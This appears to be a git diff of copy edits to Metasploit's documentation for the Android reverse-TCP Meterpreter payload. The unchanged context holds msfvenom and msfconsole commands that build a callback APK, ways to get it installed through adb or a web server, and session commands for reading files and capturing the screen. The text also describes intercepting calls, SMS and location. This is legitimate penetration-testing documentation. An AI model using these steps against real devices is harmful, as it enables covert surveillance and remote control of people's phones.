@@ -1,9 +1,8 @@
-The android/meterpreter/reverse_tcp payload is a Java-based meterpreter that can be used on an
-Android device. It is still at an early stage of development, but there's so many things you can
+The android/meterpreter/reverse_tcp payload is a Java-based Meterpreter that can be used on an
+Android device. It is still at an early stage of development, but there are so many things you can
 do with it already.
 
-The Android Meterpreter allows you to remote control the file system, listen to phone calls,
-retrieve or send SMS messages, geo-locate the user, support for post modules, etc.
+The Android Meterpreter allows you to do things like take remote control the file system, listen to phone calls, retrieve or send SMS messages, geo-locate the user, run post-exploitation modules, etc.
 
 ## Vulnerable Application
 
@@ -14,9 +13,9 @@ You can test android/meterpreter/reverse_tcp on these devices:
 An emulator is the most convenient way to test Android Meterpreter. You can try:
 
 * [Android SDK](http://developer.android.com/sdk/index.html#Other) - Creates and manages your emulators from a command prompt or terminal.
-* [Android Studio](http://developer.android.com/sdk/installing/index.html?pkg=studio) - Easier to use than the SDK for managing the emulators.
-* [GenyMotion](https://www.genymotion.com/download/) - An account is required.
-* [AndroidAVDRepo](https://github.com/dral3x/AndroidAVDRepo) - A collection of pre-configured emulators.
+* [Android Studio](http://developer.android.com/sdk/installing/index.html?pkg=studio) - Allows you to manage emulators more easily than the SDK.
+* [GenyMotion](https://www.genymotion.com/download/) - Requires an account. 
+* [AndroidAVDRepo](https://github.com/dral3x/AndroidAVDRepo) - Contains a collection of pre-configured emulators.
 
 
 **A real Android device**
@@ -31,7 +30,7 @@ get to test it over a real network.
 Currently, the most common way to use Android Meterpreter is to create it as an APK, and then
 execute it.
 
-To create the APK, here is how with msfconsole:
+To create the APK with msfconsole:
 
 ```
 msf > use payload/android/meterpreter/reverse_tcp 
@@ -42,14 +41,14 @@ msf payload(reverse_tcp) > generate -t raw -f /tmp/android.apk
 msf payload(reverse_tcp) >
 ```
 
-And here is how with msfvenom:
+To create the APK with msfvenom:
 
 ```
 ./msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
 ```
 
 Next, start an Android device. Upload the APK, and execute it. There are different ways to do this,
-so please refer to Scenarios for more information.
+so please refer to the Scenarios section for more information.
 
 ## Important Basic Commands
 
@@ -64,7 +63,7 @@ meterpreter > pwd
 
 **cd**
 
-The ```cd``` command allows you to change directory. Example:
+The ```cd``` command allows you to change directory. For example:
 
 ```
 meterpreter > cd cache
@@ -73,11 +72,11 @@ meterpreter > ls
 
 **cat**
 
-The ```cat``` command allows you to see the content of a file.
+The ```cat``` command allows you to see the contents of a file.
 
 **ls**
 
-The ```ls``` command display items in a directory. Example:
+The ```ls``` command displays items in a directory. For example:
 
 ```
 meterpreter > ls
@@ -101,7 +100,7 @@ option allows you to do so recursively.
 
 **search**
 
-THe ```search``` command allows you to find files on the remote target. For example:
+The ```search``` command allows you to find files on the remote target. For example:
 
 ```
 meterpreter > search -d . -f *.txt
@@ -134,7 +133,7 @@ IPv6 Netmask : ::
 
 **getuid**
 
-The ```getuid``` command shows you the current user that the payload is running as:
+The ```getuid``` command shows the current user that the payload is running as:
 
 ```
 meterpreter > getuid
@@ -143,7 +142,7 @@ Server username: u0_a231
 
 **ps**
 
-The ```ps``` command shows you a list of processes the Android device is running. For example:
+The ```ps``` command shows a list of processes the Android device is running. For example:
 
 ```
 meterpreter > ps 
@@ -334,7 +333,7 @@ meterpreter > run post/android/capture/screen
 **Uploading APK to an Emulator using install_msf_apk.sh**
 
 The Metasploit Framework comes with a script that allows you to automatically upload your APK to
-an active emulator, and execute it. It requires the [Android SDK platform-tools](http://developer.android.com/sdk/installing/index.html) to run, as well as [Java](https://java.com/en/download/).
+an active emulator and execute it. It requires the [Android SDK platform-tools](http://developer.android.com/sdk/installing/index.html) to run, as well as [Java](https://java.com/en/download/).
 
 To use this, follow these steps:
 
@@ -364,7 +363,7 @@ rm failed for -f, Read-only file system
 Starting: Intent { act=android.intent.action.MAIN cmp=com.metasploit.stage/.MainActivity }
 ```
 
-Back to msfconsole, you should receive a session:
+Back in msfconsole, you should receive a session:
 
 ```
 [*] Started reverse TCP handler on 192.168.1.199:4444 
@@ -377,7 +376,7 @@ meterpreter >
 
 **Uploading APK to a real Android device using install_msf_apk.sh**
 
-On the Android device, make sure to enable Developer Options. You can do this by:
+On the Android device, make sure to enable Developer Options. To do this:
 
 1. Go to Settings -> About -> Software Information
 2. Tap on the Build Number section a couple of times. It should unlock Developer Options.
@@ -404,10 +403,10 @@ And you should get a session.
 **Uploading APK from a Web Server**
 
 One way to upload an APK to Android without adb is by hosting it from a web server. To do this,
-you must make sure to allow to trust "Unknown sources". Exactly how to do this varies, but normally
+you must make sure to allow to trust "Unknown sources". The way to do this varies, but normally
 it's something like this: Settings -> Security -> Check "Unknown Sources"
 
-Once you have that changed, do:
+Once you have that changed, you'll need to:
 
 1. Generate the APK payload.
 2. Start a web server from the directory where the payload is: ```ruby -run -e httpd . -p 8181```
@@ -418,10 +417,9 @@ Once you have that changed, do:
 **Reconnect Android Meterpreter from the Browser Remotely**
 
 When you have the APK payload installed on your Android device, another trick to reconnect it is to
-launch an intent from a browser - a term in Android development meaning an operation to be
-performed.
+launch an intent from a browser. An intent is simply a term in Android development that means "an operation to be performed."
 
-To do this, here is how:
+Here's how you do this:
 
 1. In msfconsole, start a multi/handler for android/meterpreter/reverse_tcp as a background job.
 2. Do: ```auxiliary/server/android_browsable_msf_launch```.
